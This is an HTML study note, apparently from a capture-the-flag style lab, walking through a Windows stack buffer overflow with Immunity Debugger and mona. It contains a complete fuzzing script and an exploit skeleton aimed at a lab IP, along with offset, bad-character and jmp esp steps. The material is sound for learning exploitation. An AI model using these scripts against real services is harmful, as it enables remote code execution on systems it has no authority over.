<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>01- Windows Buffer Overflow</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>01- Windows Buffer Overflow</h1><br/><p><strong><h2>Intro</h2></strong></p><p><img src="images/158-1.png" alt="images/158-1.png" /><ul><li>CPU registers<ul><li></li></ul></li></ul><img src="images/158-2.png" alt="images/158-2.png" /><ul><li></li><li>stack stores register pointers and arguments</li></ul></li><li>ESP, EBP,EIP<ul><li>ESP: stack pointer: latest referenced address, in the stack</li><li>EBP: pointer of top of stack when function is called</li><li>EIP: instruction pointer: points to the next instruction to be executed<ul><li>target for buffer overflows</li></ul></li></ul></li><li>Buffer overflow demo<ul><li></li></ul><img src="images/158-3.png" alt="images/158-3.png" /></p><p></p><p></p><p></p><p><strong><h2>Practical Immunity debugger</h2></strong><ol><li>launch immunity as administrator<ol><li> !mona config -set workingfolder c:\mona\%p</li><li>run script</li><li> fuzzing.py (tib3rius)</li></ol></li></ol></p><p>   ```python```</p><p>   </p><p> <h3>#!/usr/bin/env python3</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>import socket, time, sys</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>ip = &quot;10.10.171.69&quot;</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>port = 1337</h3><h3></h3></p><p><h3>timeout = 5</h3><h3></h3></p><p><h3>prefix = &quot;OVERFLOW1 &quot;</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>string = prefix + &quot;A&quot; * 100</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>while True:</h3><h3></h3></p><p><h3>  try:</h3><h3></h3></p><p><h3>    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:</h3><h3></h3></p><p><h3>      s.settimeout(timeout)</h3><h3></h3></p><p><h3>      s.connect((ip, port))</h3><h3></h3></p><p><h3>      s.recv(1024)</h3><h3></h3></p><p><h3>      print(&quot;Fuzzing with {} bytes&quot;.format(len(string) - len(prefix)))</h3><h3></h3></p><p><h3>      s.send(bytes(string, &quot;latin-1&quot;))</h3><h3></h3></p><p><h3>      s.recv(1024)</h3><h3></h3></p><p><h3>  except:</h3><h3></h3></p><p><h3>    print(&quot;Fuzzing crashed at {} bytes&quot;.format(len(string) - len(prefix)))</h3><h3></h3></p><p><h3>    sys.exit(0)</h3><h3></h3></p><p><h3>  string += 100 * &quot;A&quot;</h3><h3></h3></p><p><h3>  time.sleep(1)</h3></p><p>  </p><p>  ```</p><p>  <ul><li>  <h3>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l </h3>&lt;number of bytes crashed&gt;</li></ul></li><li>reload script in immunity with ctrl f2 + f9<ul><li>exploit.py <ul><li>```python```<ul><li><h3>import socket</h3></li></ul></li></ul></li></ul><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>ip = &quot;10.10.171.69&quot;</h3><h3></h3></p><p><h3>port = 1337</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>prefix = &quot;OVERFLOW1 &quot;</h3><h3></h3></p><p><h3>offset = 0</h3><h3></h3></p><p><h3>overflow = &quot;A&quot; * offset</h3><h3></h3></p><p><h3>retn = &quot;&quot;</h3><h3></h3></p><p><h3>padding = &quot;&quot;</h3><h3></h3></p><p><h3>payload = &quot;&quot;</h3><h3></h3></p><p><h3>postfix = &quot;&quot;</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>buffer = prefix + overflow + retn + padding + payload + postfix</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</h3><h3></h3></p><p><h3></h3><h3></h3></p><p><h3>try:</h3><h3></h3></p><p><h3>  s.connect((ip, port))</h3><h3></h3></p><p><h3>  print(&quot;Sending evil buffer...&quot;)</h3><h3></h3></p><p><h3>  s.send(bytes(buffer + &quot;\r\n&quot;, &quot;latin-1&quot;))</h3><h3></h3></p><p><h3>  print(&quot;Done!&quot;)</h3><h3></h3></p><p><h3>except:</h3><h3></h3></p><p><h3>  print(&quot;Could not connect.&quot;)</h3></p><p>  </p><p>  </p><p>  <ul><li>  !mona findmsp -distance &lt;length&gt;<ul><li>Log data, item 18</li></ul></li></ul></p><p> Address=0BADF00D</p><p> Message=    EIP contains normal pattern : 0x6f43396e (offset 1978)<ul><li> determine bad chars one by one<ul><li><h3>!mona compare -f C:\mona\o\bytearray.bin -a &lt;</h3>ESP address&gt;</li><li>badchars=\x00\x07</li><li>update byte array</li><li>identify a valid jump ESP</li></ul></li><li><strong><h2>Finding a Jump Point</h2></strong></li></ul><strong><h2></h2></strong></p><p><strong><h2></h2></strong></p><p><h3>With the o.exe either running or in a crashed state, run the following mona command, making sure to update the -cpb option with all the badchars you identified (including \x00):</h3><h3></h3></p><p><h3></h3></p><p><code><h3>!mona jmp -r esp -cpb &quot;\x00&quot;</h3></code></p><p><h3>This command finds all &quot;jmp esp&quot; (or equivalent) instructions with addresses that don&#39;t contain any of the badchars specified. The results should display in the &quot;Log data&quot; window (use the Window menu to switch to it if needed).</h3></p><p><h3>Choose an address and update your exploit.py script, setting the &quot;retn&quot; variable to the address, written backwards (since the system is little endian). For example if the address is \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit.</h3><h3></h3></p><p><h3></h3></p><p></p></div>
</body>
</html>
